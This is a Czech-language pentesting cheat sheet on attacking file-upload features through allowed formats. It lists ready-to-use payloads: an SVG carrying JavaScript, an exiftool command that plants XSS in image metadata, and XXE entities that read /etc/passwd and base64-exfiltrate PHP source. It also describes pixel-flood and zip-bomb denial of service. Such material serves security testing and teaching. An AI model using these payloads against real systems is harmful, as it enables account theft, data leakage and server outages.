Pokud webová aplikace neumožňuje nahrání přímo spustitelných skriptů (např. `.php` pro RCE), lze zneužít vlastnosti povolených formátů (SVG, HTML, XML, JPG, DOCX) k provedení útoků typu XSS, XXE nebo Denial of Service (DoS).

| **Útok**              | **Povolené formáty** | **Mechanismus zneužití**                                        | **Výsledný dopad**                                                         |
| --------------------- | -------------------- | --------------------------------------------------------------- | -------------------------------------------------------------------------- |
| **Stored XSS**        | HTML, SVG, JPG/PNG   | Vložení JavaScriptu do struktury XML, HTML nebo Exif metadat.   | Krádež session cookies, CSRF, klientská infekce.                           |
| **XXE Injection**     | SVG, XML, DOCX, PDF  | Zpracování škodlivých externích entit XML parserem na backendu. | Čtení lokálních souborů (`/etc/passwd`), exfiltrace zdrojových kódů, SSRF. |
| **Denial of Service** | ZIP, JPG, PNG        | Dekompresní bomby nebo alokace nadměrné paměti (Pixel Flood).   | Vyčerpání RAM/CPU, pád webového serveru.                                   |

**1. Stored XSS přes omezené soubory**

- **SVG Obrázky (XML JavaScript):** SVG soubory jsou založeny na XML a prohlížeč v nich nativně vykonává JavaScript:
    
    ```	
    <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1"> <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" /> <script type="text/javascript">alert(window.origin);</script> </svg>
    ```
    
- **Exif Metadata obrázků:** Pokud aplikace po nahrání zobrazuje metadata obrázku, lze payload vkládat do textových polí (např. `Comment` nebo `Artist`):
    
    Bash
    
    ```
    exiftool -Comment='"><img src=1 onerror=alert(1)>' image.jpg
    ```
    

**2. XXE (XML External Entity) v dokumentech a SVG**

Pokud backend zpracovává nahrávané XML soubory, vektorové obrázky nebo dokumenty MS Office, lze definovat externí entitu:

- **Čtení systémových souborů přes SVG:**
    
    ```
    <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <svg>&xxe;</svg>
    ```
    
- **Exfiltrace zdrojového kódu PHP (Base64 Wrapper):**
    
    ```
    <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> <svg>&xxe;</svg>
    ```
    

**3. Denial of Service (DoS) útoky**

- **Pixel Flood Attack:** U komprimovaných formátů (JPG/PNG) se ručně upraví rozměry v hlavičce souboru na extrémní hodnoty (např. `0xffff x 0xffff`). Aplikace se při vykreslování pokusí alokovat gigabajty paměti RAM a zhroutí se.
    
- **Zip / Decompression Bomb:** Nahrání malého ZIP archivu obsahujícího rekurzivně zabalená data. Automatické rozbalení na serveru okamžitě zaplní diskovou kapacitu.